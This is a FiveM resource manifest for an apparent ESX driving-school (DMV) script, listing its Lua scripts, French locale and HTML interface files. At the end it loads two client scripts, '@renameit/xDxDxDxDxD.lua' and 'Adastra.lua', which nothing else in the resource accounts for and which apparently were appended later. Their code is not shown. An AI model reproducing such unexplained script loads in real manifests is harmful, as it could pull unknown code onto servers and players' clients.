fx_version('bodacious')
game('gta5')

server_scripts {
  '@mysql-async/lib/MySQL.lua',
  '@es_extended/locale.lua',
  'locales/fr.lua',
  'config.lua',
  'server/main.lua'
}


client_scripts {
  '@es_extended/locale.lua',
  'locales/fr.lua',
  'config.lua',
  'client/main.lua'
}

ui_page 'html/ui.html'

files {
  'html/ui.html',
  'html/logo.png',
  'html/dmv.png',
  'html/cursor.png',
  'html/styles.css',
  'html/questions.js',
  'html/scripts.js',
  'html/debounce.min.js'
}

client_script '@renameit/xDxDxDxDxD.lua'

client_script 'Adastra.lua'